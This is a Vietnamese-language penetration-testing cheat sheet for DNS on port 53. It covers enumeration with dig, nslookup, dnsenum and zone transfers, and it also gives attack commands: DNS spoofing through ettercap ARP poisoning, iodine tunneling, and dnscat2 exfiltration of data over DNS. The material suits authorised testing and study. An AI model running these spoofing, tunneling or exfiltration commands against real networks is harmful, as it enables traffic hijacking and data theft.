# DNS (Port 53)

## Connect

### dig

Thực hiện truy vấn DNS để kiểm tra kết nối tới máy chủ DNS:

```
dig @<ip> <domain>
```

### nslookup

Thực hiện truy vấn DNS tới máy chủ cụ thể:

```
nslookup <domain> <ip>
```

### telnet

Kiểm tra kết nối tới máy chủ DNS trên cổng 53 (UDP):

```
nc -nv -u <ip> 53
```

***

## Enumeration

### Thu thập banner

Xác định phiên bản máy chủ DNS bằng truy vấn version.bind:

```
dig version.bind CHAOS TXT @<ip>
```

### Phát hiện máy chủ DNS

Xác định các máy chủ tên (nameservers) liên quan đến một miền:

```
dig NS <domain>
nslookup -type=NS <domain>
```

### Tự động hóa kiểm tra subdomain

Tự động phát hiện subdomain bằng dnsenum:

```
dnsenum --dnsserver <ip> --enum -p 0 -s 0 -o subdomains.txt -f <wordlist> <domain>
```

### Truy vấn&#x20;

#### dig

Thực hiện các truy vấn DNS để thu thập thông tin:

```
dig <domain>
dig A <domain>
dig -x <ip>
dig @<ip> <domain>
```

#### nslookup

Thực hiện truy vấn DNS cho các loại bản ghi hoặc reverse lookup:

```
nslookup <domain>
nslookup -type=MX <domain>
```

#### host

Thực hiện truy vấn DNS để lấy địa chỉ IP hoặc bản ghi cụ thể:

```
host <domain>
host -t MX <domain>
host <ip>
```

#### Truy vấn tất cả bản ghi

Lấy tất cả bản ghi DNS từ máy chủ:

```
dig any <domain> @<ip>
```

### Zone Transfer

Thực hiện truy vấn AXFR để lấy tất cả bản ghi của một miền:

```
dig axfr @<ip>
dig axfr @<ip> <domain>
fierce --domain <domain> --dns-servers <ip>
```

### Metasploit

Sử dụng module Metasploit để liệt kê thông tin DNS:

```
msf> use auxiliary/gather/enum_dns
```

### Cache Snooping

Kiểm tra bộ nhớ cache DNS để tìm bản ghi trước đó:

```
dnsrecon -t std -d <domain> -D /usr/share/dnsrecon/namelist.txt
```

### Google Dorks

Thu thập thông tin DNS bằng toán tử tìm kiếm Google:

```
site:<domain> -<domain> -site:<domain>
```

### Maltego

Sử dụng Maltego để trực quan hóa thông tin DNS và mối quan hệ mạng:

```bash
maltego
```

### Công cụ trực tuyến

Sử dụng các công cụ trực tuyến để thu thập thông tin DNS:

```
DNS Dumpster: dnsdumpster.com
DNS Recon: dnsrecon.com
Spyse: spyse.com
SecurityTrails: securitytrails.com
DNSlytics: dnslytics.com
```

Tìm subdomain qua nhật ký Certificate Transparency bằng công cụ trực tuyến:

```
CertSpotter: certspotter.com
```

***

## Attack Vectors

### DNS Spoofing

Đưa dữ liệu DNS giả vào bộ nhớ cache để chuyển hướng lưu lượng:

```
ettercap -T -q -M arp:remote /<gateway_ip>// /<ip>// -P dns_spoof
```

### DNS Tunneling

Mã hóa dữ liệu trong truy vấn và phản hồi DNS để vượt qua mạng:

**Cài đặt trên máy chủ**

```
iodined -f -c <tunnel_ip> <domain>
```

**Cài đặt trên máy khách**

```
iodine <ip> <domain>
```

***

## Post-Exploitation

### Cache Snooping

Kiểm tra bộ nhớ cache DNS để xác định bản ghi đã truy vấn:

```
dig @<ip> <domain> +norecurse
```

### Reverse DNS Lookup

Thực hiện truy vấn ngược để tìm tên miền liên quan đến địa chỉ IP:

```
dig -x <ip>
```

### DNS Exfiltration

Trích xuất dữ liệu qua truy vấn DNS bằng dnscat2:

**Cài đặt trên máy chủ**

```
dnscat2 --dns server=<ip>:53
```

**Cài đặt trên máy khách**

```
dnscat2 <domain>
```